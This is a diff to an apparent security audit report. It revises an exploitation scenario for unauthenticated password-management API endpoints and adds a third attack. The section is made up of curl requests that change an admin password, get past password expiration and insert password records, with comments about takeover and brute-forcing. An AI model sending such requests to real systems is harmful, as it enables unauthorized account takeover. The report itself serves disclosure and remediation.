@@ -636,16 +636,18 @@ const updateBefore = {
 **Exploitation Scenario**:
 
 ```bash
-# Attack 1: Change admin password without authentication
+# Attack 1: Change admin password WITHOUT any authentication or validation
 curl -X POST http://target/api/editpassword \
   -H "Content-Type: application/json" \
   -d '{
     "fields": {
       "userId": 1,
-      "newPassword": "hacked123!A",
-      "oldPassword": "anything"
+      "newPassword": "hacked123!A"
     }
   }'
+
+# Result: Admin password changed! No authentication, no oldPassword check
+# editPassword-controller.js DOES NOT validate oldPassword (lines 26-51)
 
 # Attack 2: Bypass password expiration
 curl -X POST http://target/api/update-before \
@@ -656,7 +658,19 @@ curl -X POST http://target/api/update-before \
     }
   }'
 
-# Result: Complete account takeover without any credentials!
+# Attack 3: Insert password record (this ONE checks currentPassword if provided)
+curl -X POST http://target/api/insert-password \
+  -H "Content-Type: application/json" \
+  -d '{
+    "fields": {
+      "userId": 1,
+      "password": "hacked123!A",
+      "currentPassword": "userpassword"
+    }
+  }'
+# But without authentication, attacker can try passwords until currentPassword matches
+
+# Result: Complete account takeover without authentication!
 ```
 
 **Recommended Solution**:
